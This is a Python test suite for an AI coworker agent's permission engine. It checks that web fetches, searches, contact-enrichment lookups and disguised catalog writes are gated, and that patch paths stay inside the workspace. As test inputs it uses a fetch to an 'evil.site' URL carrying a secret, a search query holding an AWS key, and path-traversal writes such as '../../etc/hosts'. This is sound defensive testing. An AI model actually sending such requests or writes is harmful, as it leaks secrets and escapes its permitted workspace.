"""PR1 — egress split, override tightening, and write-path scoping.

Covers the parts of the golden matrix that need a configured override resolver or exercise
the helpers directly. See `ocw-context/docs/reviewed-auto-mode.md` Part 3.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from coworker.permissions import Mode, PermissionEngine, write_paths
from coworker.risk import RiskClass, classify


# -- egress classification ------------------------------------------------------
def test_web_fetch_is_egress_not_read():
    assert classify("web_fetch") is RiskClass.EGRESS
    # web_search is egress too (§2.2, decided 2026-08-12): the destination is fixed (the
    # configured provider) but the query is model-chosen free text — an outbound channel.
    assert classify("web_search") is RiskClass.EGRESS


def test_web_search_gated_like_egress(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.INTERACTIVE)
    d = eng.evaluate("web_search", {"query": "AWS_SECRET_KEY=abc123"}, None)
    assert not d.allowed and d.needs_user
    # "Always allow searches this session" is a tool-wide grant — provider-wide, since the
    # destination is fixed. After it, searches run without asking.
    eng.allow_tool_for_session("web_search")
    assert eng.evaluate("web_search", {"query": "anything"}, None).allowed
    # A domain allowlist is meaningless for web_search (no url argument) and must not leak.
    eng2 = PermissionEngine(workspace_root=tmp_path, allowed_domains=["python.org"])
    assert eng2.evaluate("web_search", {"query": "x"}, None).needs_user


def test_web_search_session_grant_ignored_in_auto_approve(tmp_path):
    # §1.5: in Auto-Approve, in-flow session grants route to the reviewer instead.
    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.AUTO_APPROVE)
    eng.allow_tool_for_session("web_search")
    assert eng.evaluate("web_search", {"query": "x"}, None).needs_user


@pytest.mark.parametrize(
    "mode,expected_needs_user,expected_allowed",
    [
        (Mode.INTERACTIVE, True, False),  # asks
        (Mode.CUSTOM, True, False),  # asks
        (Mode.PLAN, False, False),  # denied (read-only, egress is not a read)
        (Mode.DISCUSS, False, False),  # denied
        (Mode.BYPASS_APPROVALS, False, True),  # allowed
    ],
)
def test_web_fetch_gated_in_every_mode(tmp_path, mode, expected_needs_user, expected_allowed):
    eng = PermissionEngine(workspace_root=tmp_path, mode=mode)
    d = eng.evaluate("web_fetch", {"url": "https://evil.site/log?d=SECRET"}, None)
    assert d.allowed is expected_allowed
    assert d.needs_user is expected_needs_user


def test_egress_domain_allowlist_subdomain_match(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path, allowed_domains=["python.org"])
    assert eng.evaluate("web_fetch", {"url": "https://docs.python.org/3"}, None).allowed
    # a look-alike that merely ends with the string must NOT match
    assert not eng.evaluate("web_fetch", {"url": "https://evil-python.org/x"}, None).allowed


def test_egress_session_domain_grant(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path)
    assert eng.evaluate("web_fetch", {"url": "https://api.github.com/x"}, None).needs_user
    eng.allow_domain_for_session("https://api.github.com/anything")
    assert eng.evaluate("web_fetch", {"url": "https://api.github.com/x"}, None).allowed


def test_session_domain_grant_strips_www(tmp_path):
    # §1.9: bbc.com and www.bbc.com are one grant — pure spelling, nothing broader.
    eng = PermissionEngine(workspace_root=tmp_path)
    eng.allow_domain_for_session("https://www.bbc.com/news/article")
    assert eng.session_allow_domains == {"bbc.com"}
    assert eng.evaluate("web_fetch", {"url": "https://bbc.com/sport"}, None).allowed
    assert eng.evaluate("web_fetch", {"url": "https://www.bbc.com/sport"}, None).allowed
    # NOT eTLD+1: an unrelated suffix look-alike never matches.
    assert not eng.evaluate("web_fetch", {"url": "https://notbbc.com/x"}, None).allowed
    # A host that merely STARTS with www-something keeps its spelling.
    eng.allow_domain_for_session("https://www2.example.org/a")
    assert "www2.example.org" in eng.session_allow_domains


# -- override tightening --------------------------------------------------------
def _override(mapping):
    return lambda name: mapping.get(name)


def test_override_cannot_downgrade_builtin_write(tmp_path):
    # A user override marking write_file as a harmless read must be ignored: path scoping
    # and the read-only gate both key off the class, so a downgrade would switch off both.
    ov = _override({"write_file": RiskClass.READ})
    assert classify("write_file", None, ov) is RiskClass.WRITE_LOCAL

    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.PLAN, risk_overrides=ov)
    d = eng.evaluate("write_file", {"path": "../../escape.txt", "content": "x"}, None)
    assert not d.allowed  # still blocked; the downgrade did nothing


def test_override_can_still_relax_a_plugin_tool(tmp_path):
    # The intended use survives: a non-built-in (MCP) tool defaulting to external can be
    # relaxed to read.
    from types import SimpleNamespace

    ov = _override({"mcp__notion__search": RiskClass.READ})
    meta = SimpleNamespace(requires_approval=True, category="mcp")
    assert classify("mcp__notion__search", meta, ov) is RiskClass.READ


def test_override_may_tighten(tmp_path):
    # Tightening a plugin read up to exec is honoured.
    ov = _override({"mcp__x__run": RiskClass.EXEC})
    assert classify("mcp__x__run", None, ov) is RiskClass.EXEC


# -- catalog effects vs UX labels (OPE-111) -------------------------------------
# These connector tools were catalogued "read" while actually writing to disk or
# carrying model-chosen egress, which routed them around approval, the reviewer,
# root scoping, and read-only mode all at once. The names are pinned here so a
# future catalog edit can't quietly reopen the hole.
_CATALOG_WRITES_IN_DISGUISE = (
    "github_clone",  # writes a repo tree to disk
    "github_pull",  # mutates a working tree
    "browser_screenshot",  # writes an image file, creating parent dirs
    "browser_upload_file",  # sends a local file's contents off-machine
)
# Model-chosen URLs: web_fetch by another name, so they take the full egress path
# (domain allowlist, host-named cards), not the bare approval gate.
_CATALOG_EGRESS_IN_DISGUISE = ("browser_open_url",)


def test_disguised_catalog_writes_gate():
    from coworker.connectors.tool_defs import approval_for_tool

    for name in _CATALOG_WRITES_IN_DISGUISE:
        assert approval_for_tool(name) is True, name
        assert classify(name) is RiskClass.EXTERNAL, name
    for name in _CATALOG_EGRESS_IN_DISGUISE:
        assert approval_for_tool(name) is True, name
        assert classify(name) is RiskClass.EGRESS, name


def test_catalog_floor_holds_even_with_lying_metadata():
    # The floor keys off the catalog, not the attached metadata — a mis-built
    # requires_approval=False cannot un-gate a catalog write.
    from types import SimpleNamespace

    meta = SimpleNamespace(requires_approval=False)
    assert classify("github_clone", meta) is RiskClass.EXTERNAL


def test_override_cannot_relax_a_catalog_write(tmp_path):
    ov = _override({"github_clone": RiskClass.READ})
    assert classify("github_clone", None, ov) is RiskClass.EXTERNAL

    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.PLAN, risk_overrides=ov)
    d = eng.evaluate("github_clone", {"repo": "octo/repo"}, None)
    assert not d.allowed  # read-only mode still applies; the downgrade did nothing


def test_catalog_reads_stay_relaxed_and_unprompted(tmp_path):
    from coworker.connectors.tool_defs import approval_for_tool

    for name in ("browser_read_page", "email_search", "github_get_issue"):
        assert approval_for_tool(name) is False, name
        assert classify(name) is RiskClass.READ, name
    # And the plugin-relaxation path is untouched for genuine reads.
    ov = _override({"email_search": RiskClass.READ})
    assert classify("email_search", None, ov) is RiskClass.READ


def test_disguised_writes_blocked_in_read_only_modes(tmp_path):
    from types import SimpleNamespace

    meta = SimpleNamespace(requires_approval=True)
    for mode in (Mode.DISCUSS, Mode.PLAN):
        eng = PermissionEngine(workspace_root=tmp_path, mode=mode)
        for name in _CATALOG_WRITES_IN_DISGUISE + _CATALOG_EGRESS_IN_DISGUISE:
            d = eng.evaluate(name, {}, meta)
            assert not d.allowed, f"{name} ran in {mode.value} mode"


# -- write-path extraction / scoping -------------------------------------------
def test_write_paths_simple_tools():
    assert write_paths("write_file", {"path": "a.txt"}) == (["a.txt"], True)
    assert write_paths("replace_in_file", {"path": "b.py"}) == (["b.py"], True)
    # a write tool with no locatable path → not located → caller fails closed
    assert write_paths("write_file", {}) == ([], False)


def test_write_paths_from_patch_blob():
    patch = "*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch"
    assert write_paths("apply_patch", {"patch": patch}) == (["src/app.py"], True)
    diff = "--- a/old.py\n+++ b/new.py\n@@\n-a\n+b"
    assert write_paths("apply_unified_diff", {"diff": diff}) == (["new.py"], True)


def test_unknown_write_tool_fails_closed(tmp_path):
    # A tool promoted to write via an override, whose path we can't locate, must not slip
    # through auto mode unscoped — it asks instead.
    ov = _override({"weird_writer": RiskClass.WRITE_LOCAL})
    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.BYPASS_APPROVALS, risk_overrides=ov)
    d = eng.evaluate("weird_writer", {"blob": "..."}, None)
    assert not d.allowed and d.needs_user


def test_patch_scoping_holds_in_auto_mode(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.BYPASS_APPROVALS)
    escape = "*** Begin Patch\n*** Update File: ../../etc/hosts\n@@\n-a\n+b\n*** End Patch"
    assert not eng.evaluate("apply_patch", {"patch": escape}, None).allowed
    ok = "*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch"
    assert eng.evaluate("apply_patch", {"patch": ok}, None).allowed


# -- contact enrichment is egress, not a read -----------------------------------
# Apollo/Hunter lookups send a real person's name and email to a third-party data broker
# to ask the question at all. That is the web_search shape — fixed destination, model-chosen
# query — except the query is somebody else's personal data, and they never agreed to it.
_ENRICHMENT = [
    ("apollo_enrich_person", {"email": "jane@acme.com", "name": "Jane Smith"}),
    ("apollo_enrich_company", {"domain": "acme.com"}),
    ("apollo_search_people", {"q": "VP Engineering fintech"}),
    ("hunter_domain_search", {"domain": "acme.com"}),
    ("hunter_find_email", {"domain": "acme.com", "first_name": "Jane", "last_name": "Smith"}),
    ("hunter_verify_email", {"email": "jane@acme.com"}),
]


@pytest.mark.parametrize("tool,args", _ENRICHMENT)
def test_enrichment_lookups_classify_as_egress(tool, args):
    from coworker.connectors.tool_defs import approval_for_tool

    assert classify(tool) is RiskClass.EGRESS, tool
    # The catalog label agrees with the gate, so the UI and the engine cannot drift apart.
    assert approval_for_tool(tool) is True, tool


@pytest.mark.parametrize("tool,args", _ENRICHMENT)
def test_enrichment_asks_before_sending_someone_elses_details(tmp_path, tool, args):
    gate = PermissionEngine(workspace_root=tmp_path, mode=Mode.AUTO_APPROVE)
    d = gate.evaluate(tool, args, None)
    assert not d.allowed and d.needs_user


@pytest.mark.parametrize("mode", [Mode.DISCUSS, Mode.PLAN])
def test_enrichment_no_longer_runs_in_read_only_modes(tmp_path, mode):
    # The bug underneath the policy question: catalogued as a read, a lookup would send a
    # third party's name to a broker during a mode that exists to do nothing consequential.
    gate = PermissionEngine(workspace_root=tmp_path, mode=mode)
    d = gate.evaluate("hunter_find_email", {"domain": "acme.com", "first_name": "Jane"}, None)
    assert not d.allowed and not d.needs_user


def test_an_override_cannot_quietly_make_enrichment_a_read_again(tmp_path):
    ov = _override({"hunter_find_email": RiskClass.READ})
    assert classify("hunter_find_email", None, ov) is RiskClass.EGRESS


def test_genuine_connector_reads_are_untouched():
    # The floor is about data leaving on the way out, not about connectors in general:
    # reading your own mailbox or calendar stays free.
    for name in ("email_search", "gcal_list_events", "gmail_get_message", "github_get_issue"):
        assert classify(name) is RiskClass.READ, name
